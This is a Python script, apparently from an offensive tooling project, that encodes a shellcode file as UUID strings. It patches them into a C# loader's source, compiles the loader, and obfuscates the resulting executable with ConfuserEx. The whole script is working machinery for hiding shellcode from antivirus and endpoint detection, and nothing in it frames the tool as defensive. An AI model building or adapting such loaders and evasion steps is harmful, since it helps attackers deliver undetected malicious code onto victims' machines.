import uuid
import argparse
import subprocess

# I need my colors
HEADER = '\033[95m'
BLUE = '\033[94m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

# Status symbols
SUCCESS = f"{BOLD}{GREEN}[+]{RESET} "
EVENT = f"{BOLD}{CYAN}[*]{RESET} "
WARNING = f"{BOLD}{YELLOW}[!]{RESET} "
FAILURE = f"{BOLD}{RED}[-]{RESET} "

def convert_to_uuid(shellcode):
    if len(shellcode) % 16 != 0:
        print(f"{WARNING} Shellcode length is not a multiple of 16 bytes")
        print(f"{WARNING} Adding NOPS at the end of shellcode (this might break something!)")
        print(f"{EVENT} Modified shellcode length: ", len(shellcode) + (16 - (len(shellcode) % 16)))

        null_bytes = b"\x90" * (16 - (len(shellcode) % 16))
        shellcode += null_bytes

    uuids = []
    for i in range(0, len(shellcode), 16):
        uuid_as_string = str(uuid.UUID(bytes_le=shellcode[i:i + 16]))
        uuids.append('"' + uuid_as_string + '"')

    return uuids

def main():
    parser = argparse.ArgumentParser(description="Patch shellcode into the C# loader as UUIDs")
    parser.add_argument("file", type=argparse.FileType("rb"), help="Path to shellcode (.bin)")
    args = parser.parse_args()

    with args.file as shellcode:
        uuids = convert_to_uuid(shellcode.read())

    uuid_patch = r"        string[] uuids = {"
    for uuid in uuids:
        uuid_patch += f"\n            {uuid},"
    uuid_patch += r"        };"

    with open("src/Program.cs", "r") as file:
        source = file.read()

    patched = source.replace("        string[] uuids = {};", uuid_patch)

    with open("src/Program.cs", "w") as file:
        file.write(patched)
    
    print(f"{EVENT} Compiling patched C# assembly")
    subprocess.run("make")
    print(f"{SUCCESS} Compilation complete. Reverting UUIDs")

    with open("src/Program.cs", "w") as file:
        file.write(source)

    print(f"{EVENT} Applying obfuscation")
    subprocess.run("mono ConfuserEx/Confuser.CLI.exe bin/Program.exe -o obfuscated", shell=True)
    print(f"{SUCCESS} Obfuscated executable saved to bin/obfuscated")

if __name__ == "__main__":
    main()

